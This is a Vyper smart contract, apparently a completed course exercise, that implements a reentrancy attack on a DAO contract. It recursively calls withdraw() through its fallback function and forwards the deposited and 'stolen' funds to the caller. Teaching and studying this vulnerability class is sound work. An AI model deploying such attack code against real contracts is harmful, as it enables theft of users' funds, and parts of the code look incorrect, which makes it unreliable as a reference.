interface DAO:
    def deposit() -> bool: payable
    def withdraw() -> bool: nonpayable
    def userBalances(addr: address) -> uint256: view

dao_address: public(address)
owner_address: public(address)

@external
def __init__():
    self.dao_address = ZERO_ADDRESS
    self.owner_address = ZERO_ADDRESS

    
# Your attack will need some method for stopping the attack otherwise the continued recursive calls will exceed Ethereum’s call stack, 
# or the contract will exceed the gas limit.
@internal
def _attack() -> bool:
    assert self.dao_address != ZERO_ADDRESS
    
    # TODO: Use the DAO interface to withdraw funds.
    # Make sure you add a "base case" to end the recursion
    if self.balance < 40000000000:
        DAO(self.dao_address).withdraw()

    return True


# Your attack function should:
# Take 1 argument – the address of the DAO contract being attacked 
# Be payable – it will use these funds to execute the reentrancy attack
# Execute the reentry attack by repeatedly calling withdraw() before the DAO updates its state. This can be achieved by recursively calling the _attack method.
# Return all the payment and all stolen funds to the user who called the attack contract
@external
@payable
def attack(dao_address:address):
    self.dao_address = dao_address
    deposit_amount: uint256 = msg.value    
 
    # Attack cannot withdraw more than what exists in the DAO
    if dao_address.balance < msg.value:
        deposit_amount = dao_address.balance
    
    # TODO: make the deposit into the DAO   
    send(self.dao_address, deposit_amount)
    
    # TODO: Start the reentrancy attack
    DAO(self.dao_address).withdraw()

    # TODO: After the recursion has finished, all the stolen funds are held by this contract. 
    # Now, you need to send all funds (deposited and stolen) to the entity that called this contract
    send(msg.sender, self.balance)
    
    # pass




# You will need to use a default function. This function gets executed whenever your Attacker contract gets sent Ether (without data), 
# and should implicitly be driving your recursion.
# It cannot expect any input arguments and cannot return any values.
# If the function is annotated as @payable, this function is executed whenever the contract is sent Ether (without data). 
@external
@payable
def __default__():
    # This method gets invoked when ETH is sent to this contract's address (i.e., when "withdraw" is called on the DAO contract)
    
    # TODO: Add code here to complete the recursive call
    self._attack()

    # pass
